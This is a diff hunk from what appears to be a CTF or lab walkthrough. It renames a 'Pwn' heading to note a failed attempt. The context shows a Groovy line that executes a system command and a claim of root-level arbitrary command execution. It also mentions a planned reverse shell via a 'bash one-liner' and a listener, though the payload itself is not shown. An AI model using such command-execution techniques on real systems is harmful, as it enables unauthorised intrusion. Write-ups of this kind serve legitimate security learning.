@@ -102,7 +102,7 @@ print "cmd /c mvn".execute().text
 
 Therefore I can execute arbitrary system commands on the box as root. 
 
-## Pwn
+## Pwn Attempt (and FAIL)
 - The famous bash one-liner
 ### Set up a listener on my local/attack machine: 
 ```
